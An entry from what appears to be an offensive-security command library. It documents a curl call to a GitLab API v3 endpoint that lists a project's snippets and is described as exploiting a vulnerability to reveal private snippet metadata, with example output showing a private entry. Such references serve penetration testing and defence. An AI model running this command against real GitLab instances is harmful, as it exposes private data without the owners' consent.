---
data: >-
  curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX"
  "http://gitlab-instance/api/v3/projects/1/snippets"
tags:
  - gitlab
  - api
  - recon
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 625b5f6f-540b-4d92-a67a-dca0183fce82
created_at: '2025-12-14T17:32:10.391Z'
updated_at: '2025-12-14T17:32:10.391Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-gitlab-snippets

## Command

```bash
curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets"
```

## Description

This command queries the GitLab API to retrieve a list of all snippets for a specific project, exploiting the vulnerability to include private snippet metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--header "PRIVATE-TOKEN: XXXXXXXXXXXXXX"` | Authentication header with personal access token | Yes |
| `http://gitlab-instance/api/v3/projects/1/snippets` | API endpoint URL with project ID | Yes |

## Examples

### Basic Usage

```bash
curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/1/snippets"
```

### Advanced Usage

```bash
curl --header "PRIVATE-TOKEN: XXXXXXXXXXXXXX" -s "http://gitlab-instance/api/v3/projects/1/snippets" | jq '.[].id'
```

## Expected Output

JSON array of snippet objects, e.g., [
  {"id":6,"title":"Secret snippet","author":{"name":"User"},"visibility_level":"private",...}
], revealing private entries.

## Related

- [[commands/curl-retrieve-gitlab-snippet-raw]]
- [[procedures/Fetch-All-Snippets-via-GitLab-API]]
